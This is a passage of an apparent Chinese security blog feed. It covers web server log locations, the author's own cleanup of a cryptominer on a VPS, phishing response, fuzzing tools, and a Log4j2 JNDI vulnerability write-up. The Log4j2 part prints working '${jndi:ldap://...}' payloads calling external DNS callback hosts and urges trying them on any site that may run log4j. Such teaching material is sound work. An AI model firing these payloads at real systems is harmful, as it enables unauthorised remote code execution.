title="Apache、Nginx与IIS日志位置及内容分析"></a>Apache、Nginx与IIS日志位置及内容分析</h3><blockquote><p>Apache日志</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache——linux</span><br><span class="line">/var/log/apache2目录下，错误日志为error.log，访问日志一般带有access.log</span><br><span class="line">apache——windows</span><br><span class="line">window下日志的目录在apache安装目录的logs下</span><br></pre></td></tr></table></figure><p>apache日志示例：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.20 - - [22/Apr/2020:15:27:49 +0800] &quot;GET /1/index.php HTTP/1.1&quot; 404 490 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">远端主机名+客户端日志名称（可空）+客户端用户名（可空）+服务器时间+请求内容（方法名、地址和http协议）+响应的http状态码的最终结果+服务器发送的字节数+来源页+客户端信息UA</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">apache的日志格式也可以去自定义，所在的配置文件在/etc/apache2/apache2.conf文件里</span></span><br></pre></td></tr></table></figure><blockquote><p>Nginx日志：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LINUX：</span><br><span class="line">/var/logs/nginx</span><br><span class="line">WINODWS：</span><br><span class="line">windows下Nginx日志默认在Nginx安装目录下的logs下。</span><br></pre></td></tr></table></figure><p>日志示例</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.220 - - [10/Jul/2020:15:51:09 +0800] &quot;GET /ubuntu.iso HTTP/1.0&quot; 0.000 129 404 168 &quot;-&quot; &quot;Wget/1.11.4 Red Hat modified&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">客户端ip地址 + - +客户端用户名称（可空）+通用日志格式下的本地时间 + 请求的URL和HTTP协议 + 请求处理时间 + 请求的长度 + 请求状态 + 发送给客户端的字节数（不包括响应头大小）+ 源页面 + 客户端信息</span></span><br></pre></td></tr></table></figure><blockquote><p>IS日志位置：</p></blockquote><p> IIS的日志位置与IIS的版本号的不同也有不同，相关配置文件的位置也有不同。</p><table><thead><tr><th>版本</th><th>日志位置</th><th>配置文件位置</th></tr></thead><tbody><tr><td>IIS6</td><td>C:\Windows\System32\LogFiles</td><td>C:\WINDOWS\system32\inetsrv\MetaBase.xml</td></tr><tr><td>IIS7</td><td>C:\inetpub\logs\LogFiles</td><td>C:\Windows\System32\inetsrv\config\applicationHost.config</td></tr></tbody></table><h3 id="mysql日志"><a href="#mysql日志" class="headerlink" title="mysql日志"></a>mysql日志</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/mysql/    </span><br></pre></td></tr></table></figure><h2 id="一次服务器溯源经历"><a href="#一次服务器溯源经历" class="headerlink" title="一次服务器溯源经历"></a>一次服务器溯源经历</h2><blockquote><p>[挖矿病毒排查](<a href="https://help.aliyun.com/document_detail/161236.html#:~:text=%E9%9D%9E%E4%BA%91%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83%E7%94%A8%E6%88%B7%E5%A4%84%E7%90%86%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%EF%BC%88Windows%E7%B3%BB%E7%BB%9F%EF%BC%89">https://help.aliyun.com/document_detail/161236.html#:~:text=非云安全中心用户处理挖矿程序（Windows系统）</a> 1 执行以下命令，通过CPU占用情况排查可疑的挖矿进程。… 2 执行以下命令，查看挖矿进程的磁盘文件、进程启动命令的参数。… 3 结束挖矿进程，清除挖矿文件。,4 执行以下命令，检查主机连接的可疑网络端口。… 5 执行以下命令，检查服务器中hosts文件是否存在挖矿程序的矿 … 6 执行以下命令，排查是否存在挖矿程序设定的计划任务。)</p></blockquote><p><strong>自己曾经在VPS上开了一个搭建了Xiuno BBS社区，刚运行没过几天就被入侵了，</strong></p><p>ssh登录到服务器上的时候，发现操作有点卡，感觉到服务器的异常，有点卡顿，一开始没有太在意</p><p>慢慢越来越卡 直接动不了 然后重启后就去查找问题</p><p>然后突然想到那段时间在一个老师那学习redis写定时任务的时候，看到docker里面养了几个挖矿脚本。就是在crontab目录下，发现了几个奇怪的.sh脚本。怀疑上了是不是我也中了</p><p>我查杀溯源流程：</p><p>直接输入Top命令查看进程占用状况，再按大写的P，根据CPU利用率来看看进程：看到有一个进程的 CPU 占用率很高</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P – 以 CPU 占用率大小的顺序排列进程列表 </span><br><span class="line">M – 以内存占用率大小的顺序排列进程列表</span><br></pre></td></tr></table></figure><p>记住他的pid</p><p>分析这个异常进程</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -antlp|grep PID      #查看此端口的占用情况； </span><br><span class="line">ps -ef|grep PID      #查看该pid的进程的详细信息；</span><br></pre></td></tr></table></figure><p>终端输入 netstat -anpt，看到有一个IP 为 158.69.133.20:3333 ，明显不是我自己的异常 IP。</p><p>我顺手把 IP地址复制，利用 <a href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a> ，找到IP所在的地理位置，</p><p>我再到微步威胁情报平台查询 IP 信息 (<a href="http://x.threatbook.cn/ip/158.69.133.20">http://x.threatbook.cn/ip/158.69.133.20)</a></p><p>被标记为恶意IP，有挖矿标记</p><p>然后懂了 我的vps被入侵拉去挖矿了，十有八九就是因为刚搭的社区</p><p>现在要做的是找到入侵源头并清除他</p><p>首先要找到文件位置，<strong>kill</strong>进程。根据进程 pid 1758直接ls -lh &#x2F;proc&#x2F;PID查看该进程的具体信息：</p><p>可以看到进程的exe指向的文件在&#x2F;var&#x2F;tmp目录下，然后我们先kill -9 1758杀死进程，避免进程占用CPU资源导致我们相关操作有点慢。</p><p>后来从网上查看了一下常规的那种挖矿</p><p>这种挖矿程序，一般都是通过bash脚本进行执行（这个时候就联想到了crontab下的几个文件），然后下载进行启动</p><p>想通过 history 看看是否有 wget、curl等下载行为，后来发现好像是清空了</p><p>有去查看了系统日志：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/syslog | grep .sh</span><br></pre></td></tr></table></figure><p>发现wget下载了一个.sh脚本</p><p>由于下载地址还没有失效，可以直接下载脚本分析行为：</p><blockquote><ul><li><p>除了 &#x2F;var&#x2F;tmp 目录下的文件，其他文件已自删除</p></li><li><p>脚本中还修改了 crontab任务</p></li></ul></blockquote><p>查看这个脚本文件 发现很长很乱，疑似用base64编码了</p><p>然后把所有和的crontab有关的目录都给查看了一遍，都删了</p><p>一开始没删全一直反复出现1，原来在定时任务中会反复的自我复制</p><p>清理方式：直接删除 &#x2F;var&#x2F;tmp 目录下的恶意文件。</p><p>然后检查ssh，发现还写入了公钥</p><p>然后就想到既然写了公钥，肯定会再次登录的（因为之前的wtmp文件被清理过来了，看不到痕迹）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/btmp记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</span><br></pre></td></tr></table></figure><p>只能等他再次登录</p><p>去网上看看有没有什么办法提醒我</p><p>后来找到一个脚本实现SSH登录邮件报警</p><p>并且开启了更全面history、last命令记录，会记录什么用户，在什么ip，什么时间执行了什么命令</p><p>后来就一直等 守株待兔 </p><p>后来不久第二天就收到了 然后赶紧上机 查看history及last登录日志 </p><p>总结一下： </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总结一下：</span><br><span class="line">last：/var/log/wtmp*</span><br><span class="line">tail ~/.*h_history</span><br><span class="line">sudo tail /var/log/auth.log</span><br><span class="line">sudo tail /var/log/syslog</span><br><span class="line">w</span><br><span class="line">who</span><br><span class="line">lastb: /var/log/btmp*</span><br><span class="line">lastlog: /var/log/lastlog*</span><br></pre></td></tr></table></figure><p>记录登录ip</p><p>发现应该是真实ip</p><p>此时就暂且标记下来，待日后复仇</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在/var/log/secure可以看到登陆的情况</span><br><span class="line">在/var/log/wtmp中可以查看到登陆失败的记录（可通过lastb命令进行检查）</span><br><span class="line">在/var/log/lastlog中可以查看最近登陆的记录 （可通过last命令进行检查）</span><br><span class="line">通过who检查当前在线用户</span><br></pre></td></tr></table></figure><h1 id="如何发现钓鱼邮件"><a href="#如何发现钓鱼邮件" class="headerlink" title="如何发现钓鱼邮件"></a>如何发现钓鱼邮件</h1><h2 id="钓鱼邮件发现"><a href="#钓鱼邮件发现" class="headerlink" title="钓鱼邮件发现"></a>钓鱼邮件发现</h2><blockquote><p>发现途径如下：</p><p>邮件系统异常登录告警、员工上报、异常行为告警、邮件蜜饵告警</p><p>推荐接入微步或奇安信的情报数据。对邮件内容出现的 URL 做扫描，可以发现大量的异常链接</p></blockquote><h2 id="钓鱼邮件处置"><a href="#钓鱼邮件处置" class="headerlink" title="钓鱼邮件处置"></a>钓鱼邮件处置</h2><blockquote><p><a href="https://www.freebuf.com/articles/es/264037.html">https://www.freebuf.com/articles/es/264037.html</a></p></blockquote><ul><li><ol><li>屏蔽办公区域对钓鱼邮件内容涉及站点、URL 访问</li></ol></li></ul><blockquote><p>根据办公环境实际情况可以在上网行为管理、路由器、交换机上进行屏蔽</p><p>邮件内容涉及域名、IP 均都应该进行屏蔽</p><p>对访问钓鱼网站的内网 IP 进行记录，以便后续排查溯源可能的后果</p></blockquote><ul><li><ol start="2"><li>屏蔽钓鱼邮件</li></ol></li></ul><blockquote><p>屏蔽钓鱼邮件来源邮箱域名</p><p>屏蔽钓鱼邮件来源 IP</p><p>有条件的可以根据邮件内容进行屏蔽</p><p>删除还在邮件服务器未被客户端收取钓鱼邮件</p></blockquote><ul><li><ol start="3"><li>处理接收到钓鱼邮件的用户</li></ol></li><li><ol start="4"><li>根据钓鱼邮件发件人进行日志回溯</li></ol></li></ul><blockquote><p>此处除了需要排查有多少人接收到钓鱼邮件之外，还需要排查是否公司通讯录泄露。采用 TOP500 姓氏撞库发送钓鱼邮件的攻击方式相对后续防护较为简单。如果发现是使用公司通讯录顺序则需要根据通讯录的离职情况及新加入员工排查通讯录泄露时间。毕竟有针对性的社工库攻击威力要比 TOP100、TOP500 大很多</p></blockquote><ul><li><ol start="5"><li>通知已接收钓鱼邮件的用户进行处理</li></ol></li><li><ol start="6"><li>删除钓鱼邮件</li></ol></li><li><ol start="7"><li>系统改密</li></ol></li><li><ol start="8"><li>全盘扫毒</li></ol></li><li><ol start="9"><li>后续：溯源、员工培训提升安全意识</li></ol></li></ul><h1 id="蓝队高级操作"><a href="#蓝队高级操作" class="headerlink" title="蓝队高级操作"></a>蓝队高级操作</h1><h2 id="反击CobaltStrike-分析c2"><a href="#反击CobaltStrike-分析c2" class="headerlink" title="反击CobaltStrike 分析c2"></a>反击CobaltStrike 分析c2</h2><blockquote><ul><li><a href="http://www.hackdig.com/09/hack-465456.htm">反击CobaltStrike（一） 以假乱真</a></li><li><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng">CS Beacon通信分析</a></li><li><a href="https://zhuanlan.zhihu.com/p/158770940">c&amp;c攻击与检测分析</a></li></ul></blockquote><h2 id="信息外连c2"><a href="#信息外连c2" class="headerlink" title="信息外连c2"></a>信息外连c2</h2><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://rainy-autumn.top/archives/453">护网面试知识点复习</a></li><li><a href="https://cxymm.net/article/zlloveyouforever/125174473">2022年蓝队初级护网总结_热爱画家夫人的博客-程序员秘密</a></li><li><a href="https://cloud.tencent.com/developer/article/1815280">蓝队的自我修养之事中监控 | HVV经验分享</a></li><li><a href="https://www.freebuf.com/articles/terminal/253322.html">CobltStrike的检测与发现</a></li><li><a href="https://zhuanlan.zhihu.com/p/478353548">蓝队面试题整理</a></li><li><a href="https://cloud.tencent.com/developer/article/1815280">蓝队的自我修养之事中监控 | HVV经验分享</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 面试+笔试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fuzz测试</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8A%80%E6%9C%AF/Fuzz%E6%B5%8B%E8%AF%95.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8A%80%E6%9C%AF/Fuzz%E6%B5%8B%E8%AF%95.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载学习-侵删</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>描述:在学习它时候我们有必要学习 Fuzz音标 英&#x2F;fʌz&#x2F;;</p><ul><li>什么是Fuzz技术?</li></ul><p>答:Fuzz是一种基于黑盒的自动化软件模糊测试技术,简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试;<br>实现形式与目的:它可向目标发送随机或精心构造的数据作为计算机输入，来触发非常规反馈以达到检测漏洞的目的。</p><ul><li>优势:</li></ul><blockquote><ul><li>节约测试成本和时间;一般的Fuzz工具自带完备的异常检测机制，发送数据后能精准查出哪些Payload导致了非常规反馈，在输出中将这些触发异常的Payload列出，大大降低了人工测试成本，渗透测试人员只需关注感兴趣的部分。</li><li>检测范围、规模大;自动化工具在测试用例的效率和完善上是人工无法比较的，且很多潜在的有效Payload套路固定，这些Payload就无需手工测试，只需有一份精心构造的文件和规则即可完成Fuzz。</li><li>覆盖可能性多，可检测出意想不到的异常;</li></ul></blockquote><ul><li>Fuzz的核心思想:</li></ul><blockquote><ul><li>目录Fuzz(漏洞点)</li><li>参数Fuzz(可利用参数)</li><li>PayloadFuzz(bypass)</li></ul></blockquote><h1 id="Fuzz应用场景"><a href="#Fuzz应用场景" class="headerlink" title="Fuzz应用场景"></a>Fuzz应用场景</h1><ol><li>漏洞挖掘与Fuzz之敏感目录类似的工具,可能您再入门的时候使用过御剑而其内置的字典就是Fuzz的一种;</li></ol><blockquote><p>那么这种扫描有什么好处呢？</p><p>答:就是针对一部分网站可以扫描的全面，只要你的字典足够强大就可以扫描到绝大多部分的目录和文件，来自Blasting_dictionary(附录1)的爆破字典很好</p></blockquote><ol start="2"><li>漏洞挖掘与Fuzz之敏感文件可利用参数</li></ol><blockquote><ul><li>fuzz参数来达到Jsonp劫持以及XSS漏洞等等;</li><li>越权验证信息</li></ul></blockquote><ol start="3"><li>漏洞挖掘与Fuzz之Bypass</li></ol><blockquote><ul><li>SQL injection Bypass</li><li>Open redirect</li><li>XSS Fuzzer</li></ul></blockquote><h1 id="Fuzz常用工具"><a href="#Fuzz常用工具" class="headerlink" title="Fuzz常用工具"></a>Fuzz常用工具</h1><ul><li><p>御剑: 界面化目录和文件扫描</p></li><li><p>Dirsearch : 扫描模式和dirbuster是差不多</p></li><li><p>Dirb :他的字典和御剑的不一样的就是没有针对目录和准确的定位到每个文件而是一个一个的目录名，那么这种扫描下是有一些有点的就是先发现目录在进行文件爆破，而且dirb的判断很智能他在你输入目标后会进行计算错误的请求，避免内些返回200的not found</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage : dirb https://domain.com/</span><br></pre></td></tr></table></figure></li><li><p>Nikto : 作用在于目录的爆破</p></li><li><p>wfuzz : 一款十分万能的工具我最近的目录爆破全都是使用wfuzz用熟练之后真的非常十分方便，排除一些响应码之后直接baseline这是我目前比较喜欢的用法</p><p>案例就是wfuzz</p><p>在fuzz过后发现了item参数，这是访问 <a href="http://rob-sec-1.com/test/?item=XSSpayload%E6%88%90%E5%8A%9F%E5%BC%B9%E7%AA%97">http://rob-sec-1.com/test/?item=XSSpayload成功弹窗</a></p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hh 53 &#x27;http://rob-sec-1.com/test/?FUZZ=XSSpayload&#x27;</span><br><span class="line"></span><br><span class="line">Target: HTTP://rob-sec-1.com/test/?FUZZ=XSSpayload</span><br><span class="line">Total requests: 4614</span><br><span class="line">ID    Response   Lines      Word         Chars          Payload    </span><br><span class="line">02127:  C=200      9 L           8 W         84 Ch      &quot;item&quot;</span><br><span class="line"></span><br><span class="line">Total time: 14.93025</span><br><span class="line">Processed Requests: 4614</span><br><span class="line">Filtered Requests: 4613</span><br><span class="line">Requests/sec.: 309.0369</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190920095433.png" alt="WeiyiGeek." style="zoom:50%;" /><h2 id="辅助Fuzz的工具"><a href="#辅助Fuzz的工具" class="headerlink" title="辅助Fuzz的工具"></a>辅助Fuzz的工具</h2><p>Burpsuite的扩展程序CO2: Sqlmapper模块很好对于我这种注入菜的很的来说简直就是福音，而CeWler的功能是参数提取，比如我们在Http history 里找返回包右键发送到CeWler模块就可以进行参数提取了，在实战中的用处很大，可以把参数提取出来保存做参数字典更高效。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><blockquote><p><a href="https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a></p></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li>原文地址：<a href="https://blog.weiyigeek.top/2019/8-28-379.html">https://blog.weiyigeek.top/2019/8-28-379.html</a></li><li><a href="https://blog.weiyigeek.top/2019/9-20-425.html">网站扫描与Fuzz测试之敏感信息收集:</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x15 - Apache Log4j2漏洞</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x15-Apache%20Log4j2%E6%BC%8F%E6%B4%9E.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x15-Apache%20Log4j2%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Apache Log4j2漏洞</p><h1 id="Apache-log4j简介"><a href="#Apache-log4j简介" class="headerlink" title="Apache log4j简介"></a>Apache log4j简介</h1><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具，用来打印程序的日志，方便开发人员便于排查问题等。该工具重写了log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p><h1 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h1><blockquote><p>几乎无处不在</p></blockquote><blockquote><p>影响组件应用</p><blockquote><ul><li>Apache Spring-Boot-strater-log4j2<strong>（漏洞复现一）</strong></li><li>Apache Struts2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid &#x2F; DruidElasticSearch</li></ul></blockquote><p>其他</p><blockquote><ul><li>Flume</li><li>Dubbo</li><li>Redis</li><li>Logstash</li><li>Kafka</li><li>vmvare</li></ul></blockquote><p>影响log4j版本</p><blockquote><p>Apache Log4j 2.0 ~ 2.15.0-rc1</p></blockquote></blockquote><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="log4j2日志工具简单介绍"><a href="#log4j2日志工具简单介绍" class="headerlink" title="log4j2日志工具简单介绍"></a>log4j2日志工具简单介绍</h2><p>log4j是一款通用日志记录工具，开发人员可以使用log4j对当前程序状态进行记录。log4j的功能非常强大，开发人员除了直接记录文本外，还可以使用简单表达式记录动态内容，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logger.info(&quot;system propety: $&#123;sys:user.dir&#125;&quot;);</span><br></pre></td></tr></table></figure><p>简单表达式使用 ${} 进行包裹，上述示例中，<code>sys:user.dir</code> 表示使用<strong>sys解析器</strong>，查找user.dir的内容，即在系统环境变量中查找user.dir，以替换 <code>$&#123;sys:user.dir&#125;</code> 进行打印。</p><blockquote><p>从上面这段话中，我们需要理解的是 <code>$&#123;&#125;</code> 之中包裹的内容，类似一直变量，可以通过不同的解析器解析不同的变量~</p></blockquote><p>虽然日志输出用户是看不到，所以显示了也没啥影响。但是实际上这里是存在着JNID注入的。</p><p>下面我们漏洞利用是使用的其他解析器~~JNDI</p><h2 id="JNDI注入简单介绍"><a href="#JNDI注入简单介绍" class="headerlink" title="JNDI注入简单介绍"></a>JNDI注入简单介绍</h2><p>JNDI，中文名叫java命名和目录接口，它为我们提供了命名和目录服务。<strong>主要是JNDI其中有一个lookup()方法，这是一个查找方法，log4j2在获取到${}这样的格式的时候会自动的去调用lookup()方法。</strong></p><p>这个方法的可怕之处就在于，<strong>如果lookup方法的参数是一个url地址时，那么客户端就会去lookup()方法参数指定的url中加载远程对象</strong>。比如我们传一个像：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lookup(&quot;rmi://127.0.0.1/test&quot;)</span><br><span class="line">lookup(&quot;ldap://127.0.0.1/test&quot;)</span><br></pre></td></tr></table></figure><p>这样的参数进去，它就可以远程访问到我们（黑客）本地的类，那如果这些类里面有恶意代码的话造成的危害显然是非常严重的。</p><h2 id="lt-关键-gt"><a href="#lt-关键-gt" class="headerlink" title="&lt;关键&gt;"></a><strong>&lt;关键&gt;</strong></h2><p>log4j中除了sys解析器外，还有很多其他类型的解析器。其中，<strong>jndi 解析器</strong>就是本次漏洞的源头。</p><p><strong>jndi 解析器将通过 jdk 获取 jndi 对象</strong>，并使用这个 jndi 对象替换原有文本进行打印。 我们将 jndi 对象理解成为一个从程序外部获取的 Java 程序对象就可以了。<strong>jdk中提供了多种不同 jndi 对象的获取方式，获取方式可以称为schema</strong>，所以正常的包含jndi的日志记录方式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logger.info(&quot;system propety: $&#123;jndi:schema://url&#125;&quot;);</span><br></pre></td></tr></table></figure><p>上述schema和url需替换成真实的内容方可生效。</p><blockquote><ul><li>schema ：</li></ul><p>schema是查找jndi对象的方式，jdk中支持以下几种schema：</p><blockquote><ul><li>corbname</li><li>dns</li><li>iiop</li><li>iiopname</li><li>ldap</li><li>ldaps</li><li>rmi</li></ul></blockquote><ul><li>url</li></ul><p>url是几种不同的schema下jndi的路径。<strong>不同的schema，url路径的配置方法不同</strong>。</p><p>常用的schame是ldap，其url写法比较简单：jndi:ldap:&#x2F;&#x2F;xxx.dnslog.cn</p></blockquote><p>jdk将从url指定的路径下载一段字节流，并将其反序列化为Java对象，作为jndi返回。反序列化过程中，即会执行字节流中包含的程序。</p><p>因此，如果攻击者能够控制日志打印的内容，就可以使目标服务器从攻击者指定的任意url地址下载代码字节流，攻击者在字节流中附带的代码就会在目标服务器上执行。</p><h2 id="如何控制日志输出？"><a href="#如何控制日志输出？" class="headerlink" title="如何控制日志输出？"></a>如何控制日志输出？</h2><p><strong><u>那么问题来了，攻击者如何控制服务器上记录的日志内容呢？</u></strong></p><blockquote><p>非常简单！ 大部分web服务程序都会对用户输入进行日志记录。例如：用户访问了哪些url，有哪些关键的输入等，都会被作为参数送到log4j中。</p><p>我们在这些地方写上 <code>$&#123;jndi:ldap://xxx.dnslog.cn&#125;</code> 就可以使web服务从<code>xxx.dnslog.cn</code>下载字节流了。</p></blockquote><p>12月9日晚，漏洞刚爆出时，在百度、google的搜索框内输入攻击字符串，就可以进行攻击。不提供输入框也好办，在url中随便附上一段也可能成功： <code>www.target.com?$&#123;jndi:schema://url&#125;</code></p><h2 id="payload干了什么"><a href="#payload干了什么" class="headerlink" title="payload干了什么"></a>payload干了什么</h2><blockquote><p><strong>当log4j2打印的日志内容中包含${jndi:ldap:&#x2F;&#x2F;x.x.x.x}时，程序会通过ldap协议访问x.x.x.x这个地址，x.x.x.x会返回一个指向class文件的地址，程序会通过返回的地址下载class文件并执行。</strong></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>Apache Log4j是一个基于Java的日志记录组件。</p><p>log4j2可以使用简单表达式记录动态内容,也就是可以传入变量，也就是<code>$&#123;&#125;</code></p><p>简单表达式使用 ${} 进行包裹变量，在 ${} 后面可以使用一些解析器，解析动态内容，打印出来解析的结果（本来我们看不到日志内容，但是可以通过dnslog带出执行结果）</p><p><strong>在这个${}里面存在着JNDI注入</strong></p><p><code>$&#123;&#125;</code>解析变量有多种方式多种解析器，log4j2漏洞便是因为jndi解析器。</p><p>主要是JNDI其中有一个lookup()方法，这是一个查找方法，log4j2在获取到${}这样的格式的时候会自动的去调用lookup()方法。</p><p>这个方法的可怕之处就在于，<strong>如果lookup方法的参数是一个url地址时，那么客户端就会去lookup()方法参数指定的url中加载远程对象</strong>。比如<code>lookup(&quot;rmi://127.0.0.1/test&quot;)</code></p><p>回过头来，jndi 解析器可以获取远程 jndi 对象。jdk中提供了多种不同 jndi 对象的获取方式，获取方式可以称为schema，注入rmi，ldap，dns</p><p>我们使用jndi利用ldap或者rmi的方式加载远程恶意类并执行即可达到我们getshell的目的</p></blockquote><h1 id="Log4j2漏洞发现"><a href="#Log4j2漏洞发现" class="headerlink" title="Log4j2漏洞发现"></a>Log4j2漏洞发现</h1><h2 id="被动扫描发现"><a href="#被动扫描发现" class="headerlink" title="被动扫描发现"></a>被动扫描发现</h2><p>通过burp插件的方式，将Log4j2漏洞检测能力集成到burp进行被动扫描。在访问网站抓包的过程中，检测到目标站点存在Log4j2 RCE漏洞。</p><blockquote><p>下载地址: <a href="https://github.com/p1n93r/Log4j2Scan/releases/download/v1.0.0/Log4j2Scan.jar">https://github.com/p1n93r/Log4j2Scan/releases/download/v1.0.0/Log4j2Scan.jar</a> </p><p>添加到burp扩展模块上使用</p></blockquote><h2 id="确认漏洞参数"><a href="#确认漏洞参数" class="headerlink" title="确认漏洞参数"></a>确认漏洞参数</h2><p>可以插入的参数太多，直接Fuzz模糊测试，由于使用参数Fuzz，每个数据包里都夹带多个参数注入Payload，我们需要进一步定位到具体的漏洞参数位置。</p><blockquote><p>Fuzz工具：</p><p><a href="https://github.com/Dghpi9/Log4j2-Fuzz">https://github.com/Dghpi9/Log4j2-Fuzz</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221625755.png" alt="image-20220922162542664" style="zoom:50%;" /><p>构造pyload验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:dns://dzgyb7ks8bqbemcmmili77efw62xqm.burpcollaborator.net/t&#125; </span><br><span class="line">burp发包需要输入进行了URL编码后的结果 </span><br><span class="line">%24%7Bjndi%3Adns%3A%2F%2Fdzgyb7ks8bqbemcmmili77efw62xqm.burpcollaborator.net%2Ft%7D</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221644035.png" alt="image-20220922164456927" style="zoom:50%;" /><h1 id="漏洞复现一"><a href="#漏洞复现一" class="headerlink" title="漏洞复现一"></a>漏洞复现一</h1><blockquote><p>涉及：srping-boot</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/log4j2-rce-2021-12-09</span><br><span class="line">docker run -dit -p 28080:8080 vulfocus/log4j2-rce-2021-12-09</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问http://124.223.217.243:28080/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">http://124.223.217.243:28080/hello/</span></span><br></pre></td></tr></table></figure><h2 id="POC测试"><a href="#POC测试" class="headerlink" title="POC测试"></a>POC测试</h2><p>很多地方都可以尝试poc，测一测，这种可能存在log4j的网站，都可以直接拿poc试一试！！~~</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">dnslog获取一个子域名http://www.dnslog.cn/</span></span><br><span class="line">a8x0nz.dnslog.cn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">填进payload</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://a8x0nz.dnslog.cn&#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">对POC进行URL编码后发送：</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">24%7Bjndi%3Aldap%3A%2F%2Fa8x0nz.dnslog.cn%7D</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">payload</span></span><br><span class="line">payload=%24%7Bjndi%3Aldap%3A%2F%2Fa8x0nz.dnslog.cn%7D</span><br><span class="line"><span class="meta prompt_">#</span><span 